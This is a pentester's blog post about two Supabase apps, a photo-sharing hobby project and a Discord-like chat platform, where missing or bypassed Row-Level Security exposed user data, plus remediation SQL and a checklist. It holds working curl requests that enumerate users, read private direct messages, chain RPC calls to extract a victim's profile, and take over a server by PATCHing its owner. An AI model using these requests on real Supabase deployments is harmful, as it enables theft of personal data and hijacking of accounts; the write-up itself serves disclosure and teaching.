---
title: "Supabase Shenanigans"
date: 2026-02-20
draft: false
description: "Supabase Shenanigans: If you're going to use Supabase, implement RLS"
summary: "Supabase is quite permissive by default, by not implementing Row-Level Security, you could be exposing PII of thousands of users."
---

## Too Long, Didn't Read

I pentested two separate apps built on Supabase in one week. Both had Row-Level Security disabled. One let me gather all users full names and emails. The other let me take over any server on the platform with a single curl command, or read every user's private messages. This is that story.

---

## The Preface

I offer free pentests to friends, family, and budding developers just setting up their websites and apps. It's good practice for me, and it benefits them. Not to mention, I almost always find something. *That's how the first engagement in this post came about*, a friend's personal project. The second engagement is different: Discord Alternative, a Discord-like chat platform, was recommended to me by a friend; I tested it as part of volunteer security research and accidentally stumbled upon these vulnerabilities. So: one free pentest for a friend, one volunteer assessment for a product I didn't build.

Both apps are built on Supabase. Both had the same class of vulnerability, and both taught me something about how developers keep making the same mistake, even when Supabase practically begs you not to in the docs.

## What is Row-Level Security (RLS)?

If you're not familiar with Supabase or PostgreSQL: **Row-Level Security (RLS)** is a database feature that restricts *which rows* a user can read or modify. Without RLS, anyone who can hit your API (and the anon key is in your frontend code) can query every row in a table. With RLS, you define policies like *"users can only SELECT rows where `user_id = auth.uid()`"* , so each user only sees their own data. Supabase supports RLS but it's off by default; if you don't enable it and write policies, your tables are wide open. Both of these apps had RLS disabled or bypassed, which is why the findings were so severe.

---

# Part One: Photo Sharing App — The Bug That Kept Coming Back

### The Setup

I went to my friend's house on a Wednesday, a weekly ritual of gaming and bonding. We catch up, play games, talk about work, and watch RuPaul's Drag Race. During one of my visits, my friend asked if I'd pentest his app for him. I couldn't have been happier. He's a talented developer, working in a fullstack position at his day job, and decided to try vibecoding for his hobby project. That only heightened my excitement. Who would say no to testing AI code? So I did what any good friend would do: tried to break into his database.

### Discovery

I spun up Burp Suite Pro, opened my terminal, and started making cURL requests. I looked for unauthenticated attacks first, then made a researcher account and poked at every input field I could find. XSS, XXE, parameter tampering, not much low-hanging fruit. My spouse had already pentested this previously and caught an XSS, so I knew the easy stuff was already reported. 

Then I spotted Supabase references in the JavaScript, and I started probing the REST API.

### The First Finding — Unauthenticated PII Exposure

Supabase auto-generates REST endpoints for every table. I started with the obvious one:

```bash
curl "https://REDACTED.supabase.co/rest/v1/users?select=email,first_name,last_name" \
  -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -H "Authorization: Bearer [MY_TOKEN]"
```

The response:

```json
[
  {"email": "REDACTED", "first_name": "test", "last_name": "asd"},
  {"email": "REDACTED", "first_name": "REDACTED", "last_name": "REDACTED"},
  {"email": "researcher@skelli.win", "first_name": "Eden", "last_name": "Stroet"}
  // ... 25 more users
]
```

No Row-Level Security. Supabase is permissive by default, if you don't explicitly enable RLS and write policies, every row is readable by anyone with the anon key, and the anon key is always public, baked into the frontend JavaScript, which is intentionally done by Supabase.

Within minutes of testing I already turned to my friend and said: "Found something. It's bad."

### The Collection Association Attack

While digging deeper I found something more creative, an RPC function called `add_person_to_collection`. You could add *any* user to *your* collection without their consent, then query `get_visible_people` to extract their full profile:

```bash
# Step 1: Add victim to your collection
curl -X POST "https://REDACTED.supabase.co/rest/v1/rpc/add_person_to_collection" \
  -H "apikey: [KEY]" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{"p_collection_id":"YOUR_ID","p_user_id":"VICTIM_ID"}'

# Step 2: Get their full PII
curl -X POST "https://REDACTED.supabase.co/rest/v1/rpc/get_visible_people" \
  -H "apikey: [KEY]" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '{"p_collection_ids":["YOUR_ID"]}'
```

Response:

```json
{
  "id": "d4425e38-0c27-4e20-aff3-f36e961c97d5",
  "first_name": "My",
  "last_name": "Friend",
  "email": "myfriend@gmail.com",
  "handle": "FriendsUsername",
  "profile_picture": "https://..."
}
```

Full PII. Email, name, handle, profile picture, mouth-watering stuff really.

I also found a debug function in production (`test_rls_condition`), an unauthenticated RPC that could modify any user's subscription data (`accrue_read_only_access`), full GraphQL introspection (82 mutations, 20+ tables visible), and a broken recursive RLS policy on `family_members` that was leaking PostgreSQL error `42P17` in API responses.

I was originally planning to head home by 23:00, but when you feel that adrenaline from hacking, you tend to lose track of time. You become so immersed in the project seeing how far you can take it. I stayed until 2AM because I get so addicted to that rush when you find something and you can't stop digging. I documented everything and sent the full report before I left.

### The First "Fix" — Column Hiding vs Row Security

He patched through the night. I tested the fix the next day:

```bash
curl "https://REDACTED.supabase.co/rest/v1/users?select=email,first_name,last_name&limit=28"
```

The emails were gone. Progress! But the names were still there. All 28 users, full names visible. He'd hidden the `email` column but forgotten to apply that fix for `first_name` and `last_name` too, and more importantly, I could still see *everyone's rows*, not just mine.

The distinction matters:

```sql
-- What he did: column-level hiding
REVOKE SELECT ON users.email FROM authenticated;

-- What he needed: row-level security
CREATE POLICY "users_select" ON users
FOR SELECT USING (user_id = auth.uid());
```

Column security hides a field. Row security controls *which rows you can see at all*.

### The Second Death — Yet Another Bypass

After disclosing that bypass, I tried my luck again. The bypass I found this time, worked. I texted him the cURL commands showing I could still enumerate first names, last names, and user IDs across all 28 accounts. He groaned, grabbed his laptop, and started patching again.

### The Real Fix

A few days later I tested again expecting another bypass. Instead:

```bash
curl "https://REDACTED.supabase.co/rest/v1/users?select=first_name,last_name&limit=28"
```

```json
[{"first_name":"Eden","last_name":"Stroet"}]
```

One record. Just me. He'd finally implemented proper RLS: `FOR SELECT USING (user_id = auth.uid())`. A few hours later, GraphQL introspection was disabled too. The bug was dead. I wish more companies patched that fast. Often times I'd be in the middle of testing and suddenly things that I had found would break because he'd be patching during testing. I admire that dedication to security. 

---

# Part Two: Discord Alternative — When the Whole Platform Is Open

Discord Alternative is a Discord-like chat application. It has servers, channels, direct messages, voice rooms. It's a real product with real users, built by a small team using React on the frontend and Supabase on the backend. I tested it as part of my volunteer security research and disclosed everything to the team, who were receptive and responsive throughout. Like my friend, they are also pretty dedicated to security. 

They soft launched their platform 3 weeks ago with just 20 users and within those 3 weeks, the platform gained 12k users! The team at the time was just two people, and this provided a lot of struggles for them. It went from a small test user base to actively firefighting reported issues that 12k users would bring.

### Authentication Architecture

Before diving into the findings, it's worth understanding how Discord Alternative's auth works, because it's the root cause of everything.

Rather than using Supabase Auth (which issues proper JWTs and populates `auth.uid()` at the database level), Discord Alternative implemented a custom authentication system using a secret key hash. At registration, a 64-character hex key is generated, hashed, and stored. On login, you send the hash in an `X-Key-Hash` header.

The problem? This validation only happens at the *middleware layer*. The Supabase REST API is directly accessible, and it has no idea what an `X-Key-Hash` is. As far as Supabase is concerned, `auth.uid()` is always null, meaning any RLS policy that relies on it does nothing.

### Finding 1 — Authentication Bypass

The custom auth header is completely ignored at the REST layer:

```bash
# Valid key hash
curl "https://[REDACTED].supabase.co/rest/v1/users" \
  -H "apikey: [ANON_KEY]" \
  -H "X-Key-Hash: [VALID_HASH]"

# Garbage key hash — identical response
curl "https://[REDACTED].supabase.co/rest/v1/users" \
  -H "apikey: [ANON_KEY]" \
  -H "X-Key-Hash: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```

Both return the same data. The auth check simply doesn't exist at this layer.



### Finding 2 — Mass PII Exposure: 8,799 Users

With no RLS SELECT policies on the `users` table:

```bash
curl "https://[REDACTED].supabase.co/rest/v1/users?select=*" \
  -H "apikey: [ANON_KEY]" \
  -H "Authorization: Bearer [ANON_KEY]"
```

Every user account on the platform (8,799 in total) is readable by anyone. Usernames, display names, avatar URLs, bio, status, pronouns, profile themes, creation timestamps, last seen timestamps. It looked like this:

```
[
  {
    "id": "59390f47-cf1d-4587-b7fe-bded91d89cd4",
    "username": "test1234",
    "display_name": null,
    "avatar_url": null,
    "banner_color": "#5865F2",
    "bio": null,
    "status": "online",
    "custom_status": null,
    "created_at": "2026-01-07T22:29:12.412199+00:00",
    "last_seen": "2026-01-07T22:29:12.412199+00:00",
    "avatar_decoration": null,
    "profile_theme_primary": null,
    "profile_theme_accent": null,
    "banner_url": null,
    "profile_effect": null,
    "pronouns": null
  },
  ```

  While this doesn't disclose anything sensitive yet, it would play a bigger part in something more sinister if someone else had found it before I did.

### Finding 3 — 6,467 Private Direct Messages Exposed

The `direct_messages` table had no RLS SELECT policy either:

```bash
curl "https://[REDACTED].supabase.co/rest/v1/direct_messages?select=*" \
  -H "apikey: [ANON_KEY]" \
  -H "Authorization: Bearer [ANON_KEY]"
```

```
Content-Range: 0-999/6467
```

6,467 private DMs. All readable. No authentication required.

Discord Alternative markets itself as a privacy-focused platform — the encryption key tables (`user_identity_keys`, `user_prekeys`, `user_signed_prekeys`) existed in the schema, and the team had clearly thought about E2E encryption — but the messages themselves were sitting in plaintext, fully exposed.

`INSERT` and `DELETE` operations were correctly blocked by RLS policies. The developers had written protection for write operations but forgotten `SELECT` entirely. A very easy mistake to make, with very serious consequences.

### Finding 4 —  Privilege Escalation via Server Ownership Takeover

This was the most impactful finding, and the simplest. The `servers` table had no RLS UPDATE policy, which meant anyone could PATCH it directly:

```bash
curl -X PATCH "https://[REDACTED].supabase.co/rest/v1/servers?id=eq.[TARGET_SERVER_ID]" \
  -H "apikey: [ANON_KEY]" \
  -H "Authorization: Bearer [ANON_KEY]" \
  -H "Content-Type: application/json" \
  -d '{"owner_id":"[ATTACKER_USER_ID]"}'
```

Empty response. 204 No Content.

This one was a funny finding. First off, I was half-asleep, so when the content had returned completely empty I thought it had failed. It was maybe 1AM at this point and I wasn't really paying attention. I thought nothing of it and went to bed. My second mistake here was that I had mixed up the server ID's and used the main Discord Alternative Community server which is used to communicate to the users of the platform... I just stole the community from the Founder. In between my first disclosure and this one, I was actually invited to join their team as a volunteer pentester, which I obliged because I was having fun, and I can see their vision. This gave me access to their Slack, where one of the members posted an image in panic asking who had taken over the community server... it was me. A lot of apologizing on my side, a quick transfer back and a good laugh was had. However, it was very apparent that anyone could do this, so it had to be patched quickly.


**Fix:** `CREATE POLICY "server_owner_update" ON servers FOR UPDATE USING (owner_id = auth.uid());`

### The Root Cause

All four findings share the same root cause: Discord Alternative's custom authentication bypasses Supabase's RLS system entirely. Because `auth.uid()` is always null, any policy that references it is effectively disabled. The architectural fix is to either migrate to Supabase Auth (issuing proper JWTs), or validate the custom `X-Key-Hash` in an Edge Function that then issues a user scoped JWT before hitting the database.

---

## Impact Assessment

### Photo Sharing App
- Full PII enumeration of all users (names, emails, handles, profile pictures)
- Unauthenticated modification of subscription data
- Broken access control on collection membership

### Discord Alternative
- 8,799 user accounts fully enumerable
- 6,467 private direct messages readable by anyone
- Any server on the platform takeable with a single curl command
- Authentication mechanism completely bypassable at the REST layer

---

## Remediation

### For Supabase Developers — The Checklist

**1. Enable RLS on every table, immediately.**
```sql
ALTER TABLE your_table ENABLE ROW LEVEL SECURITY;
```

**2. Write SELECT policies, not just INSERT/DELETE.**
The most common mistake I see. Developers block writes but forget reads.
```sql
CREATE POLICY "users_own_row" ON users
FOR SELECT USING (auth.uid() = user_id);
```

**3. Don't implement custom auth at the application layer.**
If you bypass Supabase Auth, you bypass RLS. Use Supabase Auth or issue proper JWTs from your middleware, and don't try to bolt authentication on top.

**4. Audit your anon key exposure.**
The anon key is always public. Anything accessible with just the anon key is accessible to everyone on the internet. Design your RLS policies with this in mind.

**5. Disable debug functions and GraphQL introspection in production.**
Functions named `test_rls_condition` and `debug_request_headers` have no business being in a production environment.

---

## Final Words

Two apps, two entirely separate teams, the same vulnerability class. Supabase is a genuinely excellent platform, but its permissive defaults mean that a developer who doesn't understand RLS can ship a completely open database without realising it. The Supabase docs warn about this clearly, but in the excitement of shipping, it's easy to miss.

Neither of these teams were careless. Both have talented developers building real things. The mistakes were subtle, architectural, and easy to make. Which is exactly why this class of vulnerability keeps showing up.

If you're building on Supabase: enable RLS on every table before you write a single line of application code. Treat it like a seatbelt. You don't put it on after you crash.

---

## References

- [Supabase Row Level Security Documentation](https://supabase.com/docs/guides/auth/row-level-security)
- [Supabase Auth Documentation](https://supabase.com/docs/guides/auth)
